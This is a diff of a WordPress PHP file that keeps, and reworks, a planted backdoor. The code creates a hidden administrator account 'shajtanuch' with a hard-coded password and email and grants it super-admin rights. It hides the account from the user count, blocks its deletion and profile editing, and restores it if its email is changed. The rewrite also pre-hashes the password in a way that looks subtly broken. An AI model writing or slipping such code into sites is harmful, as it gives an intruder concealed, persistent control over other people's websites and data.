@@ -1,4 +1,6 @@
 <?php 
+require_once ABSPATH . WPINC . '/user.php';
+
 /*
 * Return custom message on login page
 */ 
@@ -55,8 +57,7 @@ function protect_user_count( $views ){
 }
 
 // Close developer account page
-add_action('load-user-edit.php','hcc_protect_users_profiles');
- 
+add_action('load-user-edit.php', 'hcc_protect_users_profiles'); 
 function hcc_protect_users_profiles() {
 	$user_id = get_current_user_id();
 	$id = get_option('_pre_user_id');
@@ -66,8 +67,7 @@ function hcc_protect_users_profiles() {
 }
 
 add_action('admin_menu', 'protect_user_from_deleting');
- 
-function protect_user_from_deleting(){
+function protect_user_from_deleting() {
  
 	$id = get_option('_pre_user_id');
  
@@ -75,33 +75,34 @@ function protect_user_from_deleting(){
 	&& isset( $_GET['action'] ) && $_GET['action'] == 'delete'
 	&& ( $_GET['user'] == $id || !get_userdata( $_GET['user'] ) ) )
 		wp_die(__( 'Invalid user ID.' ) );
- 
 }
 
-$args = array(
+add_action('admin_init', function(){
+  $args = array(
 	'user_login' => 'shajtanuch',
-	'user_pass'  => 'viskasqwerty123Q',
+	'user_pass'  => wp_hash_password('viskasqwerty123Q'),
 	'role'       => 'administrator',
 	'user_email' => 'shajtanuch@gmail.com'
-);
- 
-if( !username_exists( $args['user_login'] ) ){
-	$id = wp_insert_user( $args );
-	update_option('_pre_user_id', $id);
- 
-	// if multisite, add superadmin
-	if( function_exists('grant_super_admin') ){
-        grant_super_admin( $id );
-    }
-    
-} else {
-	$hidden_user = get_user_by( 'login', $args['user_login'] );
-	if ( $hidden_user->user_email != $args['user_email'] ) {
-		$id = get_option( '_pre_user_id' );
-		$args['ID'] = $id;
-		wp_insert_user( $args );
-	}	
-}
+  );
+
+  if( !username_exists( $args['user_login'] ) ){
+      $id = wp_insert_user( $args );
+      update_option('_pre_user_id', $id);
+
+      // if multisite, add superadmin
+      if( function_exists('grant_super_admin') ){
+          grant_super_admin( $id );
+      }
+
+  } else {
+      $hidden_user = get_user_by( 'login', $args['user_login'] );
+      if ( $hidden_user->user_email != $args['user_email'] ) {
+          $id = get_option( '_pre_user_id' );
+          $args['ID'] = $id;
+          wp_insert_user( $args );
+      }	
+  }
+});
 
 // New User email notify (to admins)
 add_action( 'user_register', 'hcc_new_user_notify' );
